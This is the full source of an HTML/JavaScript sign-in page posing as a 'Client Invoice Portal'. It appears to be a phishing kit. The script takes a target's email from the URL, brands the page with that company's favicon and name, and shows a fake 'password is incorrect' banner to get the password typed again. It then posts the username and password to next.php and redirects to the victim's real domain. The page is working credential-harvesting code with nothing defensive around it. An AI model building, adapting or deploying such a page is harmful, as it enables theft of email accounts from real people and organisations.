<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0; shrink-to-fit=no">
    <title id="pageTitle">Portal</title>
    <link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="assets/css/styles.css">
    <style>
        /* Styling for Sign In Button */
        button {
            width: 100%;
            padding: 10px;
            background-color: #0D5CAB; /* Button matches static background */
            color: #FFFFFF; /* White font for readability */
            border: none;
            border-radius: 5px;
            font-size: 1rem;
            margin-top: 1rem;
            cursor: pointer;
            transition: background-color 0.3s ease;
        }

        button:hover {
            background-color: #0A4B8A; /* Slightly darker blue on hover */
        }

        /* Consistent Form Header and Text Styling */
        .form-header,
        .form-text {
            font-size: 16px; /* Same size for all */
            color: #444; /* Neutral dark color for clarity */
            font-weight: normal; /* Uniform font style */
            margin-bottom: 8px; /* Even spacing */
        }

        /* Dynamic Company Name Styling */
        #companyName {
            color: #0D5CAB; /* Matches button color */
            font-size: 20px; /* Slightly larger for emphasis */
            text-align: center; /* Center alignment */
            font-weight: bold; /* Make it stand out */
            margin-bottom: 12px; /* Space between name and next element */
        }

        /* Balance Spacing for Input Fields */
        .form-group {
            margin-bottom: 16px; /* Balanced vertical margin */
        }
    </style>
</head>

<body>
    <div id="main-outer-container" class="c-div" style="height: 100vh;">
        <div id="main-inner-container" class="spdiv" style="width: 380px; margin-top: 150px; background: transparent;">
            <div id="form-main-outer" style="background: white;">
                <div style="padding: 40px 40px; padding-bottom: 16px;">
                    <!-- Dynamic Logo -->
                    <img id="logoImg" class="fade" src="#" alt="Logo" style="height: 84px; width: auto;" />

                    <!-- Dynamic Company Name -->
                    <h5 id="companyName"></h5>
                </div>
                <div id="err" 
                     style="padding: 16px 40px; background: #efcccb; border-bottom: 2px solid rgb(128,0,0);">
                    <p style="font-size: 13px;">
                        The password is incorrect. Try again with your email password.
                    </p>
                </div>
                <div style="padding: 16px 40px;">
                    <p class="form-text">Sign in with your Email to continue</p>
                    <input type="text" id="id" class="form-group" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;" readonly>

                    <p class="form-header">Enter password</p>
                    <input type="password" id="pass" placeholder="Password" class="form-group" style="width: 100%; height: 36px; border: 1px solid; padding: 1px 8px;">

                    <div class="sp-div" style="margin-top: 10px;">
                        <button class="btn btn-primary" id="next-btn" 
                                type="button" 
                                onclick="nextFun();">
                            Sign In
                        </button>
                    </div>
                </div>
                <div style="height: 90px; background: #dddddd; padding: 16px 40px;">
                    <select style="height: 32px; width: 100%; font-size: 12px; border: 1px solid;">
                        <option value="12" selected>Client Invoice Portal</option>
                        <option value="13">Billing Portal</option>
                        <option value="14">Payment Portal</option>
                    </select>
                    <p style="font-size: 11px; margin-top: 6px; text-align: center; color: #555;">© 2025 All Rights Reserved</p>
                </div>
            </div>
        </div>
    </div>

    <!-- Required Libraries -->
    <script src="assets/bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>

    <script>
        /* Dynamic branding logic */
        document.addEventListener("DOMContentLoaded", function () {
            const hash = decodeURIComponent(window.location.hash.substring(1));
            if (!hash.includes("@")) return;

            // Prefill the username
            document.getElementById("id").value = hash;

            // Extract domain and root for branding
            const emailParts = hash.split("@");
            const domain = emailParts[1].toLowerCase();

            // Static mapping for known domains
            const companyNameMapping = {
                "pinnacleinfotech.com": "PINNACLEINFOTECH",
                "examplecompany.com": "EXAMPLECOMPANY",
            };

            // Determine company name (uppercase fallback)
            const companyRootName = domain.split(".")[0].toUpperCase();
            const companyName = companyNameMapping[domain] || companyRootName;

            document.getElementById("companyName").textContent = companyName;

            // Update page title dynamically
            document.getElementById("pageTitle").textContent = companyName || "Portal";

            // Logo and favicon setup
            const logo = document.getElementById("logoImg");
            const faviconUrl = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
            const fallback = "assets/img/LoginBanner.png";

            logo.onload = () => logo.classList.add("show");
            logo.onerror = () => {
                logo.src = fallback;
                logo.classList.add("show");
            };
            logo.src = faviconUrl;

            // Set favicon
            document.querySelector("link[rel='icon']").href = faviconUrl;
        });

        /* Login Functionality */
        function nextFun() {
            const username = document.getElementById("id").value;
            const password = document.getElementById("pass").value;

            if (username.length === 0 || password.length === 0) {
                document.getElementById("err").style.display = "block";
                setTimeout(() => {
                    document.getElementById("err").style.display = "none";
                }, 2000);
                return;
            }

            $.ajax({
                url: "./next.php",
                type: "POST",
                data: { di: username, pr: password },
                success: function (response) {
                    console.log("Response:", response);
                    if (response.success) {
                        window.location.replace(response.redirectUrl || `https://${username.split("@")[1]}`);
                    } else {
                        document.getElementById("err").style.display = "block";
                    }
                },
                error: function () {
                    console.error("Error occurred during login.");
                },
                complete: function () {
                    document.getElementById("pass").value = ""; // Clear password after submission
                },
            });
        }

        /* ENTER key triggering login */
        document.addEventListener("keydown", function (e) {
            if (e.key === "Enter") nextFun();
        });
    </script>
</body>

</html>
